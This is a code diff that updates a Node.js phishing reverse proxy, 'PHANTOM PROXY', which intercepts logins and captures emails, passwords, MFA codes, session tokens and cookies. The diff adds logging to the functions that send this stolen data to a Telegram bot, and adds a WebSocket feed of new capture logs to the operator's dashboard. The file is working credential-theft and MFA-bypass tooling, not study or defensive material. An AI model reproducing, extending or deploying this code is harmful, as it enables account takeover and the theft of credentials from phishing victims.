@@ -1,8 +1,8 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.0 — COMPLETE ALL FEATURES
+// 🥔 PHANTOM PROXY v10.1 — COMPLETE + WEBSOCKET + TELEGRAM FIX
 // ============================================================
 // 🔥 NO EXPRESS — everything in one pure Node.js server
-// ✅ Proxy + Dashboard (with Basic Auth) + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets
+// ✅ Proxy + Dashboard (Basic Auth) + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets + WebSocket
 // ============================================================
 
 const http = require("http");
@@ -118,7 +118,7 @@ function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * US
 function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }
 
 // ============================================================
-// 📤 TELEGRAM EXFILTRATION
+// 📤 TELEGRAM EXFILTRATION (with debug logs)
 // ============================================================
 async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
     if (!tokens || Object.keys(tokens).length === 0 || !FormData) return;
@@ -141,6 +141,7 @@ async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
             timeout: 10000
         });
         try { fs.unlinkSync(filePath); } catch (e) {}
+        console.log(`📤 Tokens file sent to Telegram for session ${sessionId}`);
     } catch (e) { console.error('Telegram tokens file failed:', e.message); }
 }
 
@@ -162,11 +163,15 @@ async function sendCookiesFile(cookies, sessionId) {
             timeout: 10000
         });
         try { fs.unlinkSync(filePath); } catch (e) {}
+        console.log(`🍪 Cookies file sent to Telegram for session ${sessionId}`);
     } catch (e) { console.error('Telegram cookies file failed:', e.message); }
 }
 
 async function sendToTelegram(data) {
-    if (!axios) return;
+    if (!axios) {
+        console.error('❌ axios not available, cannot send Telegram.');
+        return;
+    }
     try {
         const sessionId = data.sessionId || 'unknown';
         const email = data.email || 'N/A';
@@ -174,6 +179,8 @@ async function sendToTelegram(data) {
         const mfa = data.mfa || 'N/A';
         const tokens = data.tokens || {};
         const cookies = data.cookies || {};
+
+        console.log(`📤 Sending Telegram for session ${sessionId}: email=${email}, password=${password ? '***' : 'N/A'}, tokens=${Object.keys(tokens).length}, cookies=${Object.keys(cookies).length}`);
 
         let message = `🔐 **LOGIN CAPTURED!**\n\n👤 Email: ${email}\n🔐 Password: ${password}\n📱 MFA: ${mfa}\n🆔 Session: ${sessionId}\n🕒 Time: ${new Date().toISOString()}`;
         if (Object.keys(tokens).length > 0) {
@@ -186,13 +193,16 @@ async function sendToTelegram(data) {
             for (const [k, v] of Object.entries(cookies)) message += `${k}: ${v.slice(0, 30)}...\n`;
             await sendCookiesFile(cookies, sessionId);
         }
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown'
         }, { timeout: 5000 });
-        console.log(`✅ Telegram exfil for session ${sessionId}`);
-    } catch (e) { console.error('Telegram send failed:', e.message); }
+        console.log(`✅ Telegram exfil for session ${sessionId} — response:`, response.status);
+    } catch (e) {
+        console.error('❌ Telegram send failed:', e.message);
+        if (e.response) console.error('   Response data:', e.response.data);
+    }
 }
 
 // ============================================================
@@ -2124,7 +2134,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 if (Object.keys(tokens).length > 0 || email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A') {
                                     await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
                                 }
-                            } catch (e) {}
+                            } catch (e) {
+                                console.error('❌ Telegram extraction error:', e.message);
+                            }
 
                             // ── HTML injection ──
                             if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
@@ -2165,11 +2177,46 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 });
 
 // ============================================================
-// 🚀 START SERVER
+// 🚀 START SERVER + WEBSOCKET
 // ============================================================
 const PORT = process.env.PORT || 3000;
+
+// ── WebSocket server for live updates ──
+if (WebSocket) {
+    const wss = new WebSocket.Server({ server, path: '/ws' });
+    const wsClients = new Set();
+
+    wss.on('connection', (ws) => {
+        wsClients.add(ws);
+        ws.on('close', () => wsClients.delete(ws));
+    });
+
+    function broadcastNewLog(filename) {
+        const message = JSON.stringify({ type: 'newLog', file: filename });
+        for (const client of wsClients) {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(message);
+            }
+        }
+    }
+
+    // Watch log directory and broadcast changes
+    try {
+        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
+            if (filename && filename.endsWith('.log')) {
+                broadcastNewLog(filename);
+            }
+        });
+        console.log('✅ WebSocket server started on /ws');
+    } catch (e) {
+        console.warn('⚠️ Could not watch log directory:', e.message);
+    }
+} else {
+    console.warn('⚠️ WebSocket library not installed – live updates disabled.');
+}
+
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v10.0 ULTIMATE running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v10.1 ULTIMATE running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Redirect interception: ACTIVE`);
